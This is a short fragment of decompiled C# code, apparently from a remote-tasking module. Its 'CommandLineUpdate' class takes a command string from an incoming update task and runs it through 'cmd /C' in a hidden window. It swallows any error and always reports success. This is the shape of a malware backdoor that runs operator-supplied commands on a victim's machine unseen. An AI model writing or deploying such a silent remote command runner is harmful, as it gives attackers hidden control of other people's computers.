using System;
using System.Diagnostics;

// Token: 0x02000031 RID: 49
public class CommandLineUpdate : ITaskProcessor
{
	// Token: 0x0600010E RID: 270 RVA: 0x00003B63 File Offset: 0x00001D63
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.Cmd;
	}

	// Token: 0x0600010F RID: 271 RVA: 0x0000A434 File Offset: 0x00008634
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			System.Diagnostics.Process.Start(new ProcessStartInfo("cmd", "/C " + updateTask.TaskArg)
			{
				UseShellExecute = false,
				CreateNoWindow = true
			}).WaitForExit(30000);
		}
		catch
		{
		}
		return true;
	}
}
